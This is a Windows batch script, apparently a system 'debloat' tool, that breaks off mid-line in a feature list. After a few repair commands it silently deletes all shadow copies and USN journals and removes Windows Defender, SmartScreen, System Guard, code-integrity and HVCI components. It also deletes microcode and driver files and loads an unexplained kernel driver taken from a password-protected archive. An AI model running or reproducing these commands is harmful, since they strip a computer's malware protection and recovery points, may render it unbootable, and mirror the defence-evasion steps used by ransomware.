SC config trustedinstaller start=auto
chkdsk /scan
::chkdsk c: /sdcleanup /offlinescanandfix
::chkdsk c: /f /r /x /b
netsh winsock reset
netsh winsock reset proxy
regsvr32.exe /s atl.dll
regsvr32.exe /s urlmon.dll
regsvr32.exe /s mshtml.dll
regsvr32.exe /s quartz.dll
regsvr32.exe /s shell32.dll
regsvr32 /s msxml2.dll
regsvr32 /s msxml3.dll
regsvr32 /s msxml.dll
regsvr32 /s wuaueng1.dll
regsvr32 /s wuaueng.dll
regsvr32 /s wucltui.dll
regsvr32 /s wups2.dll
regsvr32 /s wups.dll
regsvr32 /s wuweb.dll
rundll32.exe pnpclean.dll,RunDLL_PnpClean /drivers /maxclean
vssadmin delete shadows /for=c: /all /quiet
DISM /Online /Cleanup-Image /ScanHealth
DISM /Online /Cleanup-Image /CheckHealth
DISM /Online /Cleanup-Image /RestoreHealth
DISM /Online /Cleanup-Image /StartComponentCleanup
DISM /Online /Cleanup-Image /StartComponentCleanup /SPSuperseded
DISM /Online /Set-ReservedStorageState /State:Disabled
dism.exe /online /disable-feature /FeatureName:recall /noRestart
DISM /Cleanup-Wim
DISM /Cleanup-Mountpoints
sfc /scannow
winmgmt /salvagerepository
::winmgmt /resetrepository
fsutil usn deletejournal /d /n c:
fsutil usn deletejournal /d /n d:
fsutil usn deletejournal /d /n e:
fsutil usn deletejournal /d /n f:
fsutil usn deletejournal /d /n g:
taskkill /f /t /im msiexec.exe
taskkill /f /t /im CompPkgSrv.exe
taskkill /f /t /im TiWorker.exe
taskkill /f /t /im TrustedInstaller.exe
taskkill /f /t /im MoUsoCoreWorker.exe
takeown /f "C:\Windows\Prefetch" /r /d y >nul 2>&1
icacls "C:\Windows\Prefetch" /grant "Administrator":(OI)(CI)F /t >nul 2>&1
rd /s /q "C:\Windows\Prefetch" >nul 2>&1
takeown /f "%SystemRoot%\System32\drivers\Acpidev.sys"
takeown /f "%SystemRoot%\System32\drivers\Acpipagr.sys"
takeown /f "%SystemRoot%\System32\drivers\Acpitime.sys"
takeown /f "%SystemRoot%\System32\drivers\Acpipmi.sys"
icacls "%SystemRoot%\System32\drivers\Acpidev.sys" /grant %username%:F
icacls "%SystemRoot%\System32\drivers\Acpipagr.sys" /grant %username%:F
icacls "%SystemRoot%\System32\drivers\Acpitime.sys" /grant %username%:F
icacls "%SystemRoot%\System32\drivers\Acpipmi.sys" /grant %username%:F
del /f /q "%SystemRoot%\System32\drivers\Acpidev.sys"
del /f /q "%SystemRoot%\System32\drivers\Acpipagr.sys"
del /f /q "%SystemRoot%\System32\drivers\Acpitime.sys"
del /f /q "%SystemRoot%\System32\drivers\Acpipmi.sys"
takeown /f "C:\Windows\System32\mcupdate_GenuineIntel.dll"
takeown /f "C:\Windows\System32\mcupdate_AuthenticAMD.dll"
icacls "%SystemRoot%\System32\mcupdate_GenuineIntel.dll" /grant %username%:F
icacls "%SystemRoot%\System32\mcupdate_AuthenticAMD.dll" /grant %username%:F
del "C:\Windows\System32\mcupdate_GenuineIntel.dll"
del "C:\Windows\System32\mcupdate_AuthenticAMD.dll"
takeown /f "C:\Windows\System32\GameBarPresenceWriter.exe"
takeown /f "C:\Windows\System32\GameBarPresenceWriter.proxy.dll"
takeown /f "C:\Windows\System32\Windows.Gaming.UI.GameBar.dll"
icacls "%SystemRoot%\System32\GameBarPresenceWriter.exe" /grant %username%:F
icacls "%SystemRoot%\System32\GameBarPresenceWriter.proxy.dll" /grant %username%:F
icacls "%SystemRoot%\System32\Windows.Gaming.UI.GameBar.dll" /grant %username%:F
del "C:\Windows\System32\GameBarPresenceWriter.exe"
del "C:\Windows\System32\GameBarPresenceWriter.proxy.dll"
del "C:\Windows\System32\Windows.Gaming.UI.GameBar.dll"
takeown /f "C:\Windows\System32\bcastdvr.exe" >NUL 2>&1
takeown /f "C:\Windows\System32\bcastdvruserservice.dll" >NUL 2>&1
takeown /f "C:\Windows\System32\bcastdvr.proxy.dll" >NUL 2>&1
takeown /f "C:\Windows\System32\BcastDVRCommon.dll" >NUL 2>&1
takeown /f "C:\Windows\System32\BcastDVRBroker.dll" >NUL 2>&1
takeown /f "C:\Windows\System32\BcastDVRClient.dll" >NUL 2>&1
takeown /f "C:\Windows\System32\en-US\bcastdvruserservice.dll.mui" >NUL 2>&1
icacls "%SystemRoot%\System32\bcastdvr.exe" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\bcastdvruserservice.dll" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\bcastdvr.proxy.dll" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\BcastDVRCommon.dll" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\BcastDVRBroker.dll" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\BcastDVRClient.dll" /grant %username%:F >NUL 2>&1
icacls "%SystemRoot%\System32\en-US\bcastdvruserservice.dll.mui" /grant %username%:F >NUL 2>&1
del "C:\Windows\System32\bcastdvr.exe" >NUL 2>&1
del "C:\Windows\System32\bcastdvruserservice.dll" >NUL 2>&1
del "C:\Windows\System32\bcastdvr.proxy.dll" >NUL 2>&1
del "C:\Windows\System32\BcastDVRCommon.dll" >NUL 2>&1
del "C:\Windows\System32\BcastDVRBroker.dll" >NUL 2>&1
del "C:\Windows\System32\BcastDVRClient.dll" >NUL 2>&1
del "C:\Windows\System32\en-US\bcastdvruserservice.dll.mui" >NUL 2>&1
takeown /f "%SystemRoot%\System32\spool\drivers\color" /r /d y >NUL 2>&1
icacls "%SystemRoot%\System32\spool\drivers\color" /grant Administrators:F /t >NUL 2>&1
del /f /s /q "%SystemRoot%\System32\spool\drivers\color\*.*" >NUL 2>&1
for /D %%D in ("%SystemRoot%\System32\spool\drivers\color\*") do rmdir /s /q "%%D" >NUL 2>&1
takeown /f "%WinDir%\HelpPane.exe" >NUL 2>&1
icacls "%WinDir%\HelpPane.exe" /deny "Everyone:(X)" >NUL 2>&1
takeown /F %windir%\System32\CompatTelRunner.exe > NUL 2>&1
icacls %windir%\System32\CompatTelRunner.exe /grant %username%:F > NUL 2>&1
del %windir%\System32\CompatTelRunner.exe /f > NUL 2>&1
taskkill /f /t /im SearchHost.exe >NUL 2>&1
( taskkill /f /t /im SearchHost.exe & takeown /s %computername% /u %username% /f "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" & icacls "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" /grant:r %username%:F & taskkill /im SearchHost.exe /f & del "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" /s /f /q ) >NUL 2>&1
cd /d "%~dp0"
set "DKSys=%~dp0iamdrvd77hello.sys"
"C:\Program Files\7-Zip\7z.exe" x -aoa -bso0 -bsp1 "%~dp0DKTT.zip" -p"DDK" "iamdrvd77hello.sys" >nul
sc create dkkddkkk type= kernel binPath= "%DKSys%" >nul 2>&1
net start dkkddkkk
timeout /t 2 /nobreak >nul
sc stop dkkddkkk >nul 2>&1
net start dkkddkkk
sc stop dkkddkkk >nul 2>&1
sc delete dkkddkkk >nul 2>&1
del /q "%DKSys%" >nul 2>&1
sc config SecurityHealthService start= disabled >NUL 2>&1
sc stop SecurityHealthService >NUL 2>&1
sc config wscsvc start= disabled >NUL 2>&1
sc stop wscsvc >NUL 2>&1
sc config Sense start= disabled >NUL 2>&1
sc stop Sense >NUL 2>&1
sc config SgrmBroker start= disabled >NUL 2>&1
sc stop SgrmBroker >NUL 2>&1
sc config SgrmAgent start= disabled >NUL 2>&1
sc stop SgrmAgent >NUL 2>&1
sc config WdNisSvc start= disabled >NUL 2>&1
sc stop WdNisSvc >NUL 2>&1
sc config webthreatdefsvc start= disabled >NUL 2>&1
sc stop webthreatdefsvc >NUL 2>&1
sc config webthreatdefusersvc start= disabled >NUL 2>&1
sc stop webthreatdefusersvc >NUL 2>&1
sc config MDDlpSvc start= disabled >NUL 2>&1
sc stop MDDlpSvc >NUL 2>&1
sc config MDCoreSvc start= disabled >NUL 2>&1
sc stop MDCoreSvc >NUL 2>&1
sc config whesvc start= disabled >NUL 2>&1
sc stop whesvc >NUL 2>&1
sc config WdFilter start= disabled >NUL 2>&1
sc stop WdFilter >NUL 2>&1
sc config WdNisDrv start= disabled >NUL 2>&1
sc stop WdNisDrv >NUL 2>&1
sc config MsSecFlt start= disabled >NUL 2>&1
sc stop MsSecFlt >NUL 2>&1
sc config MsSecCore start= disabled >NUL 2>&1
sc stop MsSecCore >NUL 2>&1
sc config MsSecWfp start= disabled >NUL 2>&1
sc stop MsSecWfp >NUL 2>&1
sc config PlutonHeci start= disabled >NUL 2>&1
sc stop PlutonHeci >NUL 2>&1
sc config PlutonHsp2 start= disabled >NUL 2>&1
sc stop PlutonHsp2 >NUL 2>&1
sc config Hsp start= disabled >NUL 2>&1
sc stop Hsp >NUL 2>&1
sc config WinDefend start= disabled >NUL 2>&1
sc stop WinDefend >NUL 2>&1
sc config WdBoot start= disabled >NUL 2>&1
sc stop WdBoot >NUL 2>&1
takeown /f "C:\ProgramData\Microsoft\Windows Defender" /r /d y >NUL 2>&1
icacls "C:\ProgramData\Microsoft\Windows Defender" /grant *S-1-5-32-544:^(OI^)^(CI^)F /t /c >NUL 2>&1
rd /s /q "C:\ProgramData\Microsoft\Windows Defender" >NUL 2>&1
takeown /f "C:\Program Files\Windows Defender" /r /d y >NUL 2>&1
icacls "C:\Program Files\Windows Defender" /grant *S-1-5-32-544:^(OI^)^(CI^)F /t /c >NUL 2>&1
rd /s /q "C:\Program Files\Windows Defender" >NUL 2>&1
takeown /f "C:\Program Files (x86)\Windows Defender" /r /d y >NUL 2>&1
icacls "C:\Program Files (x86)\Windows Defender" /grant *S-1-5-32-544:^(OI^)^(CI^)F /t /c >NUL 2>&1
rd /s /q "C:\Program Files (x86)\Windows Defender" >NUL 2>&1
takeown /f "C:\Program Files\Windows Defender Advanced Threat Protection" /r /d y >NUL 2>&1
icacls "C:\Program Files\Windows Defender Advanced Threat Protection" /grant *S-1-5-32-544:^(OI^)^(CI^)F /t /c >NUL 2>&1
rd /s /q "C:\Program Files\Windows Defender Advanced Threat Protection" >NUL 2>&1
takeown /f "%ProgramData%\Microsoft\Windows Defender" /r /d y >nul 2>&1 & icacls "%ProgramData%\Microsoft\Windows Defender" /grant *S-1-5-32-544:(OI)(CI)F /t /c >nul 2>&1 & rd /s /q "%ProgramData%\Microsoft\Windows Defender" >nul 2>&1
for %%F in (C:\Windows\WinSxS\FileMaps\wow64_windows-defender*.manifest C:\Windows\WinSxS\FileMaps\x86_windows-defender*.manifest C:\Windows\WinSxS\FileMaps\amd64_windows-defender*.manifest C:\Windows\System32\SecurityAndMaintenance_Error.png C:\Windows\System32\SecurityAndMaintenance.png C:\Windows\System32\SecurityHealthSystray.exe C:\Windows\System32\SecurityHealthService.exe C:\Windows\System32\SecurityHealthHost.exe C:\Windows\System32\MpSigStub.exe C:\Windows\System32\drivers\SgrmAgent.sys C:\Windows\System32\drivers\WdDevFlt.sys C:\Windows\System32\drivers\WdBoot.sys C:\Windows\System32\webthreatdefsvc.dll C:\Windows\System32\webthreatdefusersvc.dll C:\Windows\System32\webthreatdefsvc.dll.mui C:\Windows\System32\webthreatdefusersvc.dll.mui C:\Windows\System32\drivers\WdFilter.sys C:\Windows\System32\wscsvc.dll C:\Windows\System32\drivers\WdNisDrv.sys C:\Windows\System32\wscproxystub.dll C:\Windows\System32\wscisvif.dll C:\Windows\System32\SecurityHealthProxyStub.dll C:\Windows\System32\smartscreen.dll C:\Windows\SysWOW64\smartscreen.dll C:\Windows\System32\smartscreen.exe C:\Windows\SysWOW64\smartscreen.exe C:\Windows\System32\SmartScreenSettings.exe C:\Windows\SysWOW64\SmartScreenSettings.exe C:\Windows\System32\DWWIN.EXE C:\Windows\SysWOW64\smartscreenps.dll C:\Windows\System32\smartscreenps.dll C:\Windows\System32\SecurityHealthCore.dll C:\Windows\System32\SecurityHealthSsoUdk.dll C:\Windows\System32\SecurityHealthSSO.dll C:\Windows\System32\SecurityHealthSSO.dll.mui C:\Windows\System32\SecurityHealthUdk.dll C:\Windows\System32\SecurityHealthAgent.dll C:\Windows\System32\drivers\mssecwfp.sys C:\Windows\System32\drivers\mssecwfp.sys.mui C:\Windows\System32\winshfhc.dll C:\Windows\SysWOW64\winshfhc.dll C:\Windows\System32\mssecwfpu.dll C:\Windows\System32\wscapi.dll C:\Windows\System32\wscadminui.exe C:\Windows\System32\ieapfltr.dll C:\Windows\SysWOW64\ieapfltr.dll C:\Windows\System32\SgrmLpac.exe C:\Windows\System32\Sgrm\SgrmLpac.exe C:\Windows\System32\drivers\SgrmAgent.sys C:\Windows\System32\SgrmBroker.exe C:\Windows\System32\Sgrm\SgrmBroker.exe C:\Windows\System32\Sgrm\SgrmAssertions.bin C:\Windows\System32\Sgrm\SgrmAssertions.cat C:\Windows\System32\SgrmEnclave.dll C:\Windows\System32\Sgrm\SgrmEnclave.dll C:\Windows\System32\SgrmEnclave_secure.dll C:\Windows\System32\Sgrm\SgrmEnclave_secure.dll C:\Windows\ELAMBKUP\WdBoot.sys C:\Windows\System32\config\ELAM C:\Windows\System32\mssecuser.dll C:\Windows\System32\windowsdefenderapplicationguardcsp.dll C:\Windows\SysWOW64\windowsdefenderapplicationguardcsp.dll C:\Windows\SysWOW64\GameBarPresenceWriter.exe C:\Windows\System32\GameBarPresenceWriter.exe C:\Windows\SysWOW64\DeviceCensus.exe C:\Windows\SysWOW64\CompatTelRunner.exe C:\Windows\system32\drivers\msseccore.sys C:\Windows\system32\drivers\MsSecFltWfp.sys C:\Windows\system32\drivers\MsSecFlt.sys C:\Windows\System32\SecurityHealth\SecurityHealthSSO.dll C:\Windows\System32\SecurityHealth\SecurityHealthSSO.dll.mui) do if exist "%%~F" (takeown /f "%%~F" /a >nul 2>&1 & icacls "%%~F" /grant *S-1-5-32-544:F /c /l >nul 2>&1 & del /f /q "%%~F")
for /d %%D in ("C:\Windows\WinSxS\amd64_security-octagon*" "C:\Windows\WinSxS\x86_windows-defender*" "C:\Windows\WinSxS\wow64_windows-defender*" "C:\Windows\WinSxS\amd64_windows-defender*" "C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy" "C:\ProgramData\Microsoft\Windows Defender" "C:\Program Files\Windows Defender Sleep" "C:\Program Files\Microsoft Update Health Tools" "C:\Windows\security\database" "C:\Program Files\Windows Security" "C:\Program Files\PCHealthCheck" "C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection" "C:\Program Files (x86)\Windows Defender Advanced Threat Protection" "C:\Program Files\Windows Defender Advanced Threat Protection" "C:\ProgramData\Microsoft\Windows Security Health" "C:\ProgramData\Microsoft\Storage Health" "C:\WINDOWS\System32\drivers\wd" "C:\Program Files (x86)\Windows Defender" "C:\Program Files\Windows Defender" "C:\Windows\System32\SecurityHealth" "C:\Windows\System32\WebThreatDefSvc" "C:\Windows\System32\Sgrm" "C:\Windows\Containers\WindowsDefenderApplicationGuard.wim" "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules\DefenderPerformance" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DefenderPerformance" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\Defender" "C:\Windows\System32\Tasks_Migrated\Microsoft\Windows\Windows Defender" "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender" "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules\Defender" "C:\Windows\System32\HealthAttestationClient" "C:\Windows\GameBarPresenceWriter" "C:\Windows\bcastdvr" "C:\Windows\Containers\serviced\WindowsDefenderApplicationGuard.wim") do if exist "%%~D" (takeown /f "%%~D" /r /d y & icacls "%%~D" /grant *S-1-5-32-544:^(OI^)^(CI^)F /t /c & rd /s /q "%%~D")
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-AppxPackage -AllUsers | Where-Object { $_.Name -like '*SecHealthUI*' } | Remove-AppxPackage -ErrorAction SilentlyContinue; Get-AppxProvisionedPackage -Online | Where-Object { $_.DisplayName -like '*SecHealthUI*' } | Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue"
net stop Audiosrv /y >nul 2>&1
net stop AudioEndpointBuilder /y >nul 2>&1
powershell -NoProfile -Command "Get-PnpDevice | Where-Object {$_.FriendlyName -like '*Voice Clarity*'} | ForEach-Object { $inf = (pnputil /get-device-info $_.InstanceId | Select-String 'Driver Name').ToString().Split(': ')[-1]; if($inf) { pnputil /delete-driver $inf /uninstall /force } }" >nul 2>&1
for /f "tokens=*" %%i in ('powershell -NoProfile -Command "Get-PnpDevice | Where-Object {$_.FriendlyName -like '*Voice Clarity*'} | Select-Object -ExpandProperty InstanceId"') do pnputil /remove-device "%%i" >nul 2>&1
for /f "tokens=*" %%i in ('powershell -NoProfile -Command "Get-PnpDevice | Where-Object {$_.FriendlyName -like '*Audio Home*'} | Select-Object -ExpandProperty InstanceId"') do pnputil /remove-device "%%i" >nul 2>&1
for /f "tokens=*" %%i in ('powershell -NoProfile -Command "Get-PnpDevice | Where-Object {$_.InstanceId -like '*VOCAEFFECTPACK*' -or $_.InstanceId -like '*AUDIOHOME*'} | Select-Object -ExpandProperty InstanceId"') do pnputil /remove-device "%%i" /subtree >nul 2>&1
for /f "tokens=*" %%i in ('powershell -NoProfile -Command "(Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\DRIVERENUM').Name | Where-Object {$_ -like '*VOCAEFFECTPACK*' -or $_ -like '*AUDIOHOME*'}"') do reg add "HKLM\SYSTEM\CurrentControlSet\Enum\SWD\DRIVERENUM\%%~nxi" /v "ConfigFlags" /t REG_DWORD /d 0x1 /f >nul 2>&1
net start AudioEndpointBuilder >nul 2>&1
net start Audiosrv >nul 2>&1
net stop ucpd >nul 2>&1
taskkill /f /im "*UCPD*" >nul 2>&1
taskkill /f /im "*UCPDMgr*" >nul 2>&1
takeown /f "%SystemRoot%\System32\UCPDMgr.exe" /a >nul 2>&1
icacls "%SystemRoot%\System32\UCPDMgr.exe" /grant:r "%username%:F" /t >nul 2>&1
attrib -s -h -r "%SystemRoot%\System32\UCPDMgr.exe" >nul 2>&1
del /f /q "%SystemRoot%\System32\UCPDMgr.exe" >nul 2>&1
takeown /f "%SystemRoot%\System32\drivers\UCPD.sys" /a >nul 2>&1
icacls "%SystemRoot%\System32\drivers\UCPD.sys" /grant:r "%username%:F" /t >nul 2>&1
attrib -s -h -r "%SystemRoot%\System32\drivers\UCPD.sys" >nul 2>&1
del /f /q "%SystemRoot%\System32\drivers\UCPD.sys" >nul 2>&1
takeown /f "%SystemRoot%\System32\Tasks\Microsoft\Windows\AppxDeploymentClient\UCPD velocity" /a >nul 2>&1
icacls "%SystemRoot%\System32\Tasks\Microsoft\Windows\AppxDeploymentClient\UCPD velocity" /grant:r "%username%:F" /t >nul 2>&1
attrib -s -h -r "%SystemRoot%\System32\Tasks\Microsoft\Windows\AppxDeploymentClient\UCPD velocity" >nul 2>&1
del /f /q "%SystemRoot%\System32\Tasks\Microsoft\Windows\AppxDeploymentClient\UCPD velocity" >nul 2>&1
for /r "%SystemRoot%\WinSxS" %%f in (*UCPD*.sys *UCPDMgr*.exe) do (takeown /f "%%f" /a >nul 2>&1 & icacls "%%f" /grant:r "%username%:F" /t >nul 2>&1 & attrib -s -h -r "%%f" >nul 2>&1 & del /f /q "%%f" >nul 2>&1 & if exist "%%f" ren "%%f" "%%~nxf.disabled" >nul 2>&1)
::packages
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$apps=@('9E2F88E3.Twitter','1527c705-839a-4832-9118-54d4Bd6a0c89','46928bounde.EclipseManager','ActiproSoftwareLLC.562882FEEB491','AdobeSystemsIncorporated.AdobePhotoshopExpress','ClearChannelRadioDigital.iHeartRadio','D5EA27B7.Duolingo-LearnLanguagesforFree','Flipboard.Flipboard','InputApp','king.com.CandyCrushSaga','king.com.CandyCrushSodaSaga','Microsoft.3DBuilder','Microsoft.549981C3F5F10','Microsoft.AAD.BrokerPlugin','Microsoft.AccountsControl','Microsoft.Appconnector','Microsoft.AsyncTextService','Microsoft.BingFinance','Microsoft.BingNews','Microsoft.BingSports','Microsoft.BingWeather','Microsoft.BioEnrollment','Microsoft.CommsPhone','Microsoft.CredDialogHost','Microsoft.ECApp','Microsoft.GamingApp','Microsoft.GetHelp','Microsoft.Getstarted','Microsoft.GroupMe10','Microsoft.LockApp','Microsoft.Messaging','Microsoft.Microsoft3DViewer','Microsoft.MicrosoftOfficeHub','Microsoft.MicrosoftSolitaireCollection','Microsoft.MicrosoftStickyNotes','Microsoft.MinecraftUWP','Microsoft.MixedReality.Portal','Microsoft.NetworkSpeedTest','Microsoft.Office.OneNote','Microsoft.Office.Sway','Microsoft.OneConnect','Microsoft.People','Microsoft.PPIProjection','Microsoft.Print3D','Microsoft.RemoteDesktop','Microsoft.SkypeApp','Microsoft.Todos','Microsoft.Wallet','Microsoft.Win32WebViewHost','Microsoft.WindowsAlarms','Microsoft.Windows.Apprep.ChxApp','Microsoft.Windows.AssignedAccessLockApp','Microsoft.Windows.CallingShellApp','Microsoft.Windows.CapturePicker','MicrosoftWindows.Client.WebExperience','microsoft.windowscommunicationsapps','Microsoft.Windows.ContentDeliveryManager','Microsoft.WindowsFeedback','Microsoft.WindowsFeedbackHub','Microsoft.Windows.Holographic.FirstRun','Microsoft.WindowsMaps','Microsoft.Windows.OOBENetworkCaptivePortal','Microsoft.Windows.OOBENetworkConnectionFlow','Microsoft.Windows.ParentalControls','Microsoft.Windows.PeopleExperienceHost','Microsoft.WindowsPhone','Microsoft.Windows.Photos','Microsoft.Windows.PinningConfirmationDialog','Microsoft.Windows.PrintQueueActionCenter','Microsoft.Windows.SecondaryTileExperience','Microsoft.Windows.SecureAssessmentBrowser','Microsoft.WindowsSoundRecorder','MicrosoftWindows.UndockedDevKit','Microsoft.Windows.XGpuEjectDialog','Microsoft.XboxApp','Microsoft.XboxGameCallableUI','Microsoft.XboxGameOverlay','Microsoft.XboxGamingOverlay','Microsoft.XboxIdentityProvider','Microsoft.XboxSpeechToTextOverlay','Microsoft.Xbox.TCUI','Microsoft.YourPhone','Microsoft.ZuneMusic','Microsoft.ZuneVideo','NarratorQuickStart','PandoraMediaInc.29680B314EFC2','ShazamEntertainmentLtd.Shazam','SpotifyAB.SpotifyMusic','Windows.CBSPreview','Windows.ContactSupport','Windows.PrintDialog','Clipchamp.Clipchamp','Microsoft.ApplicationCompatibilityEnhancements','Microsoft.BingSearch','MicrosoftCorporationII.QuickAssist','Microsoft.OutlookForWindows','Microsoft.PowerAutomateDesktop','MicrosoftWindows.CrossDevice','Microsoft.Windows.DevHome','MSTeams','GameAssist','WindowsWebExperiencePack','Windows Web Experience Pack','PowerToys.SparseApp','PowerToys.FileLocksmithContextMenu','PowerToys.ImageResizerContextMenu','PowerToys.PowerRenameContextMenu','MicrosoftWindows.Client.CoreAI','MicrosoftWindows.Client.Photon','MicrosoftWindows.Client.CoPilot','Microsoft.Windows.Ai.Copilot.Provider','Microsoft.Copilot','Microsoft.Office.ActionsServer','aimgr','Microsoft.WritingAssistant','Microsoft.MicrosoftEdgeDevToolsClient','Microsoft.Windows.AugLoop.CBS','Voiess','Speion','Livtop','InpApp','Filons','WindowsWorkload','Microsoft-Copilot-Package','Microsoft.WidgetsPlatformRuntime','Microsoft.WindowsTerminal','LinkedIn');$allInstalled=Get-AppxPackage -AllUsers -ErrorAction SilentlyContinue;$prov=Get-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue;foreach($a in $apps){$allInstalled | Where-Object {$_.Name -like \"*$a*\"} | Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue;$prov | Where-Object {$_.DisplayName -like \"*$a*\"} | Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue};$patterns=@('Microsoft-Windows-CodeIntegrity-Diagnostics-Package','Microsoft-Windows-HVSI-*','Microsoft-Windows-HypervisorEnforcedCodeIntegrity-Package','Microsoft-Windows-SenseClient-*','Microsoft-Windows-Wifi-Client-*','Windows-Defender-*','Microsoft-Windows-Ethernet-Client-Vmware-*','Microsoft-Windows-Ethernet-Client-Intel-*','Microsoft-Copilot-Package*');$allPackages=Get-WindowsPackage -Online -ErrorAction SilentlyContinue;foreach($p in $patterns){$allPackages | Where-Object {$_.PackageName -like \"*$p*\"} | Remove-WindowsPackage -Online -NoRestart -ErrorAction SilentlyContinue}" >nul 2>&1
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$apps=@('9E2F88E3.Twitter','1527c705-839a-4832-9118-54d4Bd6a0c89','46928bounde.EclipseManager','ActiproSoftwareLLC.562882FEEB491','AdobeSystemsIncorporated.AdobePhotoshopExpress','ClearChannelRadioDigital.iHeartRadio','D5EA27B7.Duolingo-LearnLanguagesforFree','Flipboard.Flipboard','InputApp','king.com.CandyCrushSaga','king.com.CandyCrushSodaSaga','Microsoft.3DBuilder','Microsoft.549981C3F5F10','Microsoft.AAD.BrokerPlugin','Microsoft.AccountsControl','Microsoft.Appconnector','Microsoft.AsyncTextService','Microsoft.BingFinance','Microsoft.BingNews','Microsoft.BingSports','Microsoft.BingWeather','Microsoft.BioEnrollment','Microsoft.CommsPhone','Microsoft.CredDialogHost','Microsoft.ECApp','Microsoft.GamingApp','Microsoft.GetHelp','Microsoft.Getstarted','Microsoft.GroupMe10','Microsoft.LockApp','Microsoft.Messaging','Microsoft.Microsoft3DViewer','Microsoft.MicrosoftOfficeHub','Microsoft.MicrosoftSolitaireCollection','Microsoft.MicrosoftStickyNotes','Microsoft.MinecraftUWP','Microsoft.MixedReality.Portal','Microsoft.NetworkSpeedTest','Microsoft.Office.OneNote','Microsoft.Office.Sway','Microsoft.OneConnect','Microsoft.People','Microsoft.PPIProjection','Microsoft.Print3D','Microsoft.RemoteDesktop','Microsoft.SkypeApp','Microsoft.Todos','Microsoft.Wallet','Microsoft.Win32WebViewHost','Microsoft.WindowsAlarms','Microsoft.Windows.Apprep.ChxApp','Microsoft.Windows.AssignedAccessLockApp','Microsoft.Windows.CallingShellApp','Microsoft.Windows.CapturePicker','MicrosoftWindows.Client.WebExperience','microsoft.windowscommunicationsapps','Microsoft.Windows.ContentDeliveryManager','Microsoft.WindowsFeedback','Microsoft.WindowsFeedbackHub','Microsoft.Windows.Holographic.FirstRun','Microsoft.WindowsMaps','Microsoft.Windows.OOBENetworkCaptivePortal','Microsoft.Windows.OOBENetworkConnectionFlow','Microsoft.Windows.ParentalControls','Microsoft.Windows.PeopleExperienceHost','Microsoft.WindowsPhone','Microsoft.Windows.Photos','Microsoft.Windows.PinningConfirmationDialog','Microsoft.Windows.PrintQueueActionCenter','Microsoft.Windows.SecondaryTileExperience','Microsoft.Windows.SecureAssessmentBrowser','Microsoft.WindowsSoundRecorder','MicrosoftWindows.UndockedDevKit','Microsoft.Windows.XGpuEjectDialog','Microsoft.XboxApp','Microsoft.XboxGameCallableUI','Microsoft.XboxGameOverlay','Microsoft.XboxGamingOverlay','Microsoft.XboxIdentityProvider','Microsoft.XboxSpeechToTextOverlay','Microsoft.Xbox.TCUI','Microsoft.YourPhone','Microsoft.ZuneMusic','Microsoft.ZuneVideo','NarratorQuickStart','PandoraMediaInc.29680B314EFC2','ShazamEntertainmentLtd.Shazam','SpotifyAB.SpotifyMusic','Windows.CBSPreview','Windows.ContactSupport','Windows.PrintDialog','Clipchamp.Clipchamp','Microsoft.ApplicationCompatibilityEnhancements','Microsoft.BingSearch','MicrosoftCorporationII.QuickAssist','Microsoft.OutlookForWindows','Microsoft.PowerAutomateDesktop','MicrosoftWindows.CrossDevice','Microsoft.Windows.DevHome','MSTeams','GameAssist','WindowsWebExperiencePack','Windows Web Experience Pack','PowerToys.SparseApp','PowerToys.FileLocksmithContextMenu','PowerToys.ImageResizerContextMenu','PowerToys.PowerRenameContextMenu','MicrosoftWindows.Client.CoreAI','MicrosoftWindows.Client.Photon','MicrosoftWindows.Client.CoPilot','Microsoft.Windows.Ai.Copilot.Provider','Microsoft.Copilot','Microsoft.Office.ActionsServer','aimgr','Microsoft.WritingAssistant','Microsoft.MicrosoftEdgeDevToolsClient','Microsoft.Windows.AugLoop.CBS','Voiess','Speion','Livtop','InpApp','Filons','WindowsWorkload','Microsoft-Copilot-Package','Microsoft.WidgetsPlatformRuntime','Microsoft.WindowsTerminal','LinkedIn');$users=Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue;foreach($a in $apps){foreach($u in $users){Get-ChildItem \"$($u.FullName)\AppData\Local\Packages\" -Filter \"*$a*\" -Directory -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue}}" >nul 2>&1
::features
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$features=@('HypervisorPlatform','HyperV-KernelInt-VirtualDevice','HyperV-Guest-KernelInt','App-Recorder','AppServerClient','App.StepsRecorder','Browser.InternetExplorer','Client-EmbeddedShellLauncher','ClientForNFS-Infrastructure','Client-KeyboardFilter','Client-ProjFS','Client-UnifiedWriteFilter','Containers-DisposableClientVM','Containers-HNS','Containers','Containers-SDN','Containers-Server-For-Application-Guard','DataCenterBridging','DirectoryServices-ADAM-Client','FaxServicesClientPackage','Hello.Face.20134','HostGuardian','IIS-ApplicationDevelopment','IIS-ApplicationInit','IIS-ASPNET45','IIS-ASP','IIS-BasicAuthentication','IIS-CertProvider','IIS-CGI','IIS-ClientCertificateMappingAuthentication','IIS-CommonHttpFeatures','IIS-CustomLogging','IIS-DefaultDocument','IIS-DigestAuthentication','IIS-DirectoryBrowsing','IIS-FTPExtensibility','IIS-FT